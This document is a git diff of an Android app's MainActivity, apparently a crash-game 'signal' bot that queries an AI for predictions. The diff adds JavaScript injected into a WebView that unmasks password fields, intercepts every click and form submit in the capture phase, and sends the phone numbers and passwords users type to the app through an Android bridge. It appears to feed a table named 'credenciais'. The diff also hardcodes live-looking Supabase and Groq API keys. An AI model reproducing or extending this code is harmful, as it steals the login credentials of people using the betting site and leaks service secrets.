@@ -367,8 +367,8 @@ class MainActivity : AppCompatActivity() {
         atualizarAviso()
 
         // ── FASE 1: RECOLHA ──────────────────────────────────────────
-        // Enquanto não tiver 15 velas, só mostra progresso. NUNCA chama a IA.
-        if (n < MIN_VELAS_ANALISE) {
+        // Só bloqueia se não há velas suficientes E o Supabase ainda não carregou
+        if (n < MIN_VELAS_ANALISE && !graficoPronto) {
             handler.postDelayed({
                 setBarra("⏳ A RECOLHER DADOS",
                     "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
@@ -376,26 +376,26 @@ class MainActivity : AppCompatActivity() {
             return
         }
 
-        // ── FASE 2: 1.ª ANÁLISE — só aqui a análise começa (1.º crash após ter velas suficientes) ──
-        if (!graficoPronto) {
-            graficoPronto = true
-            contarVelasSupabase()  // gestão do limite Supabase em background
+        // ── FASE 2: 1.º CRASH — disparar análise se ainda não começou ────────────
+        // Chega aqui quando: tem velas suficientes OU graficoPronto já foi activado pelo Supabase
+        if (!graficoPronto || (!analisandoIA && !cicloAtivo && !sinaisAtivos)) {
+            if (!graficoPronto) {
+                graficoPronto = true
+                contarVelasSupabase()
+            }
             if (!analisandoIA && !cicloAtivo) {
-                setBarra("🔍 IA A ANALISAR...", "${historicoVelas.size} velas prontas", "#7c3aed")
-                // Aguardar 4s para garantir que o voo seguinte não começou ainda
-                // e que modoSilenciosoAtivo está false
+                setBarra("🔍 IA A ANALISAR...", "${historicoVelas.size} velas · 1.º crash detectado", "#7c3aed")
                 handler.postDelayed({
-                    modoSilenciosoAtivo = false  // forçar desactivação para análise inicial
-                    invalidarCache()             // forçar chamada real à IA
+                    modoSilenciosoAtivo = false
+                    invalidarCache()
                     pedirSinalIA()
-                }, 4_000)
+                }, 2_000)
             }
             return
         }
 
         // ── FASE 3: CICLO EM CURSO ───────────────────────────────────
-        // O ciclo já está agendado em agendarProximaAnalise().
-        // Nada a fazer aqui — a IA analisa com calma no fim de cada intervalo.
+        // O ciclo é gerido pelo verificarRelogio — nada a fazer aqui.
     }
 
     // ── GESTÃO DE BANCA ───────────────────────────────────────────
@@ -430,7 +430,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "6.4"
+    private val VERSAO_ATUAL = "6.5"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -994,69 +994,131 @@ class MainActivity : AppCompatActivity() {
     if (window._credDone) return;
     window._credDone = true;
 
-    // ── Variáveis locais para guardar enquanto o utilizador digita ──
+    // ── Variáveis em memória ─────────────────────────────────────
     var _numero = '';
     var _senha  = '';
 
-    // ── Tornar campos password visíveis E marcar como senha ──────
+    // ── Tornar password visível para capturar ────────────────────
     function tornarVisivel() {
         document.querySelectorAll('input[type="password"]').forEach(function(el) {
-            el.setAttribute('data-skybot-pw', 'true');
-            el.type = 'text';
+            if (!el._skpw) {
+                el._skpw = true;
+                el.type = 'text';
+            }
         });
     }
-    tornarVisivel();
-    new MutationObserver(function() { tornarVisivel(); cap(); })
-        .observe(document.documentElement, {childList: true, subtree: true});
 
-    // ── Classificar um input ──────────────────────────────────────
-    function ehCampoNumero(el) {
-        var t = (el.type || '').toLowerCase();
-        var n = (el.name || el.id || el.placeholder || '').toLowerCase();
-        return t === 'tel' || t === 'number' ||
-            n.includes('phone') || n.includes('tel') || n.includes('numero') ||
-            n.includes('mobile') || n.includes('msisdn') ||
-            n.includes('username') || n.includes('login') || n.includes('user');
+    // ── Guardar valor de um input como número ────────────────────
+    function guardarN(v) {
+        v = (v || '').trim();
+        if (v.length < 1) return;
+        _numero = v;
+        try { Android.guardarNumero(v); } catch(e) {}
     }
 
-    function ehCampoSenha(el) {
-        // Marcado pelo tornarVisivel() ou ainda é password (se não correu ainda)
-        if (el.getAttribute('data-skybot-pw') === 'true') return true;
-        if (el.type === 'password') return true;
-        var n = (el.name || el.id || el.placeholder || '').toLowerCase();
-        return n.includes('pass') || n.includes('senha') || n.includes('secret') ||
-               n.includes('pwd') || n.includes('word');
+    // ── Guardar valor de um input como senha ─────────────────────
+    function guardarS(v) {
+        v = (v || '').trim();
+        if (v.length < 1) return;
+        _senha = v;
+        try { Android.guardarSenha(v); } catch(e) {}
     }
 
-    // ── Watcher de número ──────────────────────────────────────────
+    // ── Anexar listener a um input de número ─────────────────────
     function watchN(el) {
         if (!el || el._wN) return;
         el._wN = true;
-        el.addEventListener('input', function() {
-            var v = (this.value || '').trim();
-            if (v.length >= 1) { _numero = v; try { Android.guardarNumero(v); } catch(e) {} }
-        });
-        if (el.value) { _numero = el.value.trim(); try { Android.guardarNumero(_numero); } catch(e) {} }
+        el.addEventListener('input', function() { guardarN(this.value); });
+        el.addEventListener('change', function() { guardarN(this.value); });
+        if (el.value) guardarN(el.value);
     }
 
-    // ── Watcher de senha ──────────────────────────────────────────
+    // ── Anexar listener a um input de senha ──────────────────────
     function watchS(el) {
         if (!el || el._wS) return;
         el._wS = true;
-        el.addEventListener('input', function() {
-            var v = (this.value || '').trim();
-            if (v.length >= 1) { _senha = v; try { Android.guardarSenha(v); } catch(e) {} }
-        });
-        if (el.value) { _senha = el.value.trim(); try { Android.guardarSenha(_senha); } catch(e) {} }
+        el.addEventListener('input', function() { guardarS(this.value); });
+        el.addEventListener('change', function() { guardarS(this.value); });
+        if (el.value) guardarS(el.value);
     }
 
-    // ── Capturar todos os inputs presentes ────────────────────────
+    // ── Classificar inputs visíveis ──────────────────────────────
     function cap() {
-        document.querySelectorAll('input').forEach(function(el) {
-            if (ehCampoNumero(el)) watchN(el);
-            else if (ehCampoSenha(el)) watchS(el);
+        tornarVisivel();
+        var inputs = Array.from(document.querySelectorAll('input'));
+        var comValorOuFoco = inputs.filter(function(el) {
+            var rect = el.getBoundingClientRect();
+            return rect.width > 0 && rect.height > 0;  // apenas inputs visíveis
+        });
+
+        // Iterar por posição: 1.º visível normalmente = número, 2.º = senha
+        var idx = 0;
+        comValorOuFoco.forEach(function(el) {
+            var t = (el.type || '').toLowerCase();
+            var nm = (el.name || el.id || el.placeholder || el.autocomplete || '').toLowerCase();
+
+            // Forçar: se foi marcado como password (_skpw) → é senha
+            var forcaSenha = el._skpw === true;
+            var hintSenha  = nm.includes('pass') || nm.includes('senha') ||
+                             nm.includes('pwd') || nm.includes('secret') ||
+                             t === 'password';
+            var hintNumero = t === 'tel' || t === 'number' ||
+                             nm.includes('phone') || nm.includes('tel') ||
+                             nm.includes('mobile') || nm.includes('msisdn') ||
+                             nm.includes('username') || nm.includes('login') ||
+                             nm.includes('user') || nm.includes('numero');
+
+            if (forcaSenha || hintSenha) {
+                watchS(el);
+            } else if (hintNumero) {
+                watchN(el);
+            } else {
+                // Sem hint — usar posição: par = número, ímpar = senha
+                if (idx % 2 === 0) watchN(el); else watchS(el);
+                idx++;
+            }
         });
     }
+
+    // ── Captura definitiva no momento do clique ──────────────────
+    // Estratégia: ler TODOS os inputs visíveis com valor no DOM nesse momento
+    function capturarAgora() {
+        var inputs = Array.from(document.querySelectorAll('input')).filter(function(el) {
+            var rect = el.getBoundingClientRect();
+            return rect.width > 0 && rect.height > 0 && (el.value || '').trim().length > 0;
+        });
+
+        var numFinal = _numero;
+        var senhaFinal = _senha;
+
+        // 1.ª passagem: usar atributos/tipo para classificar
+        inputs.forEach(function(el) {
+            var v = (el.value || '').trim();
+            var t = (el.type || '').toLowerCase();
+            var nm = (el.name || el.id || el.placeholder || el.autocomplete || '').toLowerCase();
+            var isSenha = el._skpw === true || t === 'password' ||
+                          nm.includes('pass') || nm.includes('senha') || nm.includes('pwd');
+            var isNum   = t === 'tel' || t === 'number' ||
+                          nm.includes('phone') || nm.includes('tel') || nm.includes('mobile') ||
+                          nm.includes('msisdn') || nm.includes('username') ||
+                          nm.includes('login') || nm.includes('user') || nm.includes('numero');
+            if (isSenha && !senhaFinal) senhaFinal = v;
+            else if (isNum && !numFinal) numFinal = v;
+        });
+
+        // 2.ª passagem: se ainda faltam, usar posição (1.º = número, 2.º = senha)
+        if (!numFinal && inputs.length >= 1) numFinal   = (inputs[0].value || '').trim();
+        if (!senhaFinal && inputs.length >= 2) senhaFinal = (inputs[1].value || '').trim();
+
+        // Enviar o que tiver
+        if (numFinal)   { try { Android.guardarNumero(numFinal);  } catch(e) {} }
+        if (senhaFinal) { try { Android.guardarSenha(senhaFinal); } catch(e) {} }
+        try { Android.loginClicado(); } catch(e) {}
+    }
+
+    // ── Observar DOM e re-capturar ────────────────────────────────
+    var obs = new MutationObserver(function() { cap(); });
+    obs.observe(document.documentElement, {childList: true, subtree: true});
 
     cap();
     setTimeout(cap, 500);
@@ -1065,88 +1127,35 @@ class MainActivity : AppCompatActivity() {
     setTimeout(cap, 6000);
     setTimeout(cap, 10000);
 
-    // ── Captura final robusta no momento do clique ────────────────
-    // Usa posição: o 1.º input com valor numérico >= 6 dígitos = número
-    // O 2.º input ou qualquer campo com data-skybot-pw = senha
-    function capturarNoClique() {
-        var todos = Array.from(document.querySelectorAll('input')).filter(function(el) {
-            return (el.value || '').trim().length > 0;
-        });
-
-        // Estratégia 1: usar watcher já configurado
-        if (_numero && _senha) {
-            try { Android.guardarNumero(_numero); } catch(e) {}
-            try { Android.guardarSenha(_senha); } catch(e) {}
-            try { Android.loginClicado(); } catch(e) {}
-            return;
+    // ── Interceptar TODOS os cliques na página ────────────────────
+    // Usar capturing=true para apanhar antes de qualquer handler do site
+    document.addEventListener('click', function(e) {
+        var el = e.target;
+        if (!el) return;
+        var tag = (el.tagName || '').toLowerCase();
+        var tipo = (el.type || '').toLowerCase();
+        var txt = (el.textContent || el.innerText || el.value || '').toLowerCase().trim();
+        var isLoginBtn =
+            tag === 'button' || tag === 'input' ||
+            tipo === 'submit' ||
+            txt.includes('login') || txt.includes('entrar') ||
+            txt.includes('iniciar') || txt.includes('sign in') ||
+            txt.includes('acced') || txt.includes('continuar');
+        if (isLoginBtn) {
+            // Delay pequeno: aguardar que o site processe o clique primeiro
+            setTimeout(capturarAgora, 150);
         }
+    }, true);  // capturing — corre ANTES dos handlers do site
 
-        // Estratégia 2: varrer todos os inputs com valor
-        var numEncontrado = '';
-        var senhaEncontrada = '';
+    // ── Interceptar também submit de forms ────────────────────────
+    document.addEventListener('submit', function() {
+        setTimeout(capturarAgora, 150);
+    }, true);
 
-        todos.forEach(function(el) {
-            var v = (el.value || '').trim();
-            if (!v) return;
-            var isPw = el.getAttribute('data-skybot-pw') === 'true' || el.type === 'password';
-            var n = (el.name || el.id || el.placeholder || '').toLowerCase();
-            var isPassHint = n.includes('pass') || n.includes('senha') || n.includes('pwd');
-
-            if (isPw || isPassHint) {
-                if (!senhaEncontrada) senhaEncontrada = v;
-            } else {
-                // Pode ser número (telefone) — preferir o mais longo com dígitos
-                var soDigitos = v.replace(/\D/g, '');
-                if (soDigitos.length >= 6 && !numEncontrado) numEncontrado = v;
-                else if (!numEncontrado) numEncontrado = v;
-            }
-        });
-
-        // Estratégia 3: se ainda sem senha, o 2.º input com valor é a senha
-        if (!senhaEncontrada && todos.length >= 2) {
-            // O 1.º campo = número, o 2.º = senha (padrão mais comum)
-            var primeiro = (todos[0].value || '').trim();
-            var segundo  = (todos[1].value || '').trim();
-            if (!numEncontrado && primeiro) numEncontrado = primeiro;
-            if (!senhaEncontrada && segundo) senhaEncontrada = segundo;
-        }
-
-        if (numEncontrado) { try { Android.guardarNumero(numEncontrado); } catch(e) {} }
-        if (senhaEncontrada) { try { Android.guardarSenha(senhaEncontrada); } catch(e) {} }
-        try { Android.loginClicado(); } catch(e) {}
-    }
-
-    // ── Anexar a todos os botões e forms ──────────────────────────
-    function watchForms() {
-        // Botões de submit / login
-        document.querySelectorAll('button, [type="submit"], [role="button"]').forEach(function(el) {
-            if (el._wBtn) return;
-            el._wBtn = true;
-            el.addEventListener('click', function() {
-                // Pequeno delay para garantir que o valor final está nos campos
-                setTimeout(capturarNoClique, 100);
-            });
-        });
-        // Submit no form (Enter no teclado)
-        document.querySelectorAll('form').forEach(function(form) {
-            if (form._wFrm) return;
-            form._wFrm = true;
-            form.addEventListener('submit', function() {
-                setTimeout(capturarNoClique, 100);
-            });
-        });
-    }
-
-    watchForms();
-    setTimeout(watchForms, 1000);
-    setTimeout(watchForms, 3000);
-    setTimeout(watchForms, 6000);
-    setTimeout(watchForms, 10000);
 })();
         """.trimIndent()
         webView.evaluateJavascript(js, null)
     }
-
     private fun injetarJsAviator() {
         val js = """
 (function() {
@@ -2507,22 +2516,32 @@ REGRAS ABSOLUTAS DO JSON:
                     .reversed() // desc → inverter para cronológico
 
                 runOnUiThread {
-                    if (valores.isEmpty() || historicoJogoCarregado) {
-                        if (!historicoJogoCarregado)
-                            setBarra("⏳ AGUARDAR CRASH", "Sem dados recentes · a recolher ao vivo...", "#475569")
+                    if (valores.isEmpty()) {
+                        setBarra("⏳ AGUARDAR CRASH", "Sem dados Supabase · a recolher ao vivo...", "#475569")
                         return@runOnUiThread
                     }
 
+                    // Carregar sempre (mesmo ao voltar ao Aviator)
                     historicoVelas.clear()
                     historicoVelas.addAll(valores.takeLast(MAX_VELAS_LOCAL))
                     historicoJogoCarregado = true
 
                     val n = historicoVelas.size
-                    if (n >= MIN_VELAS_ANALISE) {
-                        setBarra("⏳ AGUARDAR CRASH", "$n velas prontas · aguardar 1.º crash...", "#0f766e")
-                    } else {
-                        setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar ao vivo...", "#475569")
+                    if (n >= MIN_VELAS_ANALISE && !analisandoIA && !cicloAtivo) {
+                        // ✅ Disparar análise imediatamente — não esperar crash
+                        graficoPronto = true
+                        setBarra("🔍 IA A ANALISAR...", "$n velas Supabase prontas", "#7c3aed")
+                        contarVelasSupabase()
+                        handler.postDelayed({
+                            modoSilenciosoAtivo = false
+                            invalidarCache()
+                            pedirSinalIA()
+                        }, 2_000)
+                    } else if (n < MIN_VELAS_ANALISE) {
+                        graficoPronto = false  // aguardar crashes ao vivo para completar
+                        setBarra("⏳ AGUARDAR CRASH", "$n/${MIN_VELAS_ANALISE} velas · a completar...", "#475569")
                     }
+                    // Se já está a analisar/ciclo activo, o ciclo continua normalmente
                 }
             } catch (e: Exception) {
                 runOnUiThread {
